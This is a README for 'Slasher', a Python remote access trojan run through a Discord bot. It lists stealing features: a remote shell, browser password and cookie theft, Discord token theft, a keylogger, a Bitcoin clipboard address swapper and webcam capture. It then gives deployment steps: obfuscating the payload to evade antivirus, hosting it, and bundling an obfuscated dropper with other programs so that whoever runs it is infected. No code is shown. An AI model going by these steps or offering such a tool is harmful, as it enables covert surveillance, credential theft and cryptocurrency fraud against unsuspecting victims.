# Slasher RAT

- Slasher is a 3-Stage Remote Access Trojan written in Python. 

- It is designed to be self-sufficient and doesnt depend on the target's python installation being set up properly, kinda solving the most annoying and unpredicatble part of python malware developement.

- The target only needs python installed on their system for the first run. 

- It will even continue working if the user uninstalls their (known) python environment!

- Slasher uses a discord bot for remote access instead of a server for ease of use.

*Constructive Critisizm is Appreciated! Yes, im aware its sloppy and written terribly. Ill fix it up in the future.*

# Features
- Live Remote Shell
- Chrome, Opera, Brave Passwords & Cookies Stealer
- Discord Token Stealer
- Keylogger (dump with .keydump)
- BTC Clipboard Address Swapper
- Freeze PC (until it is restarted)
- Take Webcam Photo
- Take Screenshot
- Change Wallpaper
- Ip & Geolocation Info Grabber
- Send Custom Alerts (pop-up box)
- Play Custom Text-to-speech messages
- End session with .endsession
  
- Each infected device has a dedicated channel in your discord server!
- **WINDOWS ONLY** (for now...)
  
- **More Features Coming Soon!**
  
# Usage

1. Set the "TOKEN" variable at the top of payload.py to you your discord bot token.

2. In payload.py, find the variable "id" on line 102 and replace "discord_server_id" with the ID of the server you want the bot to message in.

3. Obfuscate payload.py to avoid AV detections and your bot token being found. (I use [Pyobfuscate](https://pyobfuscate.com))

4. Put embed.py, payload.py, run.vbs and runner.bat in a zip and upload it to some website to download later. (Private github repo is easiest)
   
5. In dropper.py, set the "url" variable on line 24 to the download link to your zip file.

6. Obfuscate dropper.py or bundle it with another program! Anybody who runs it will be infected!
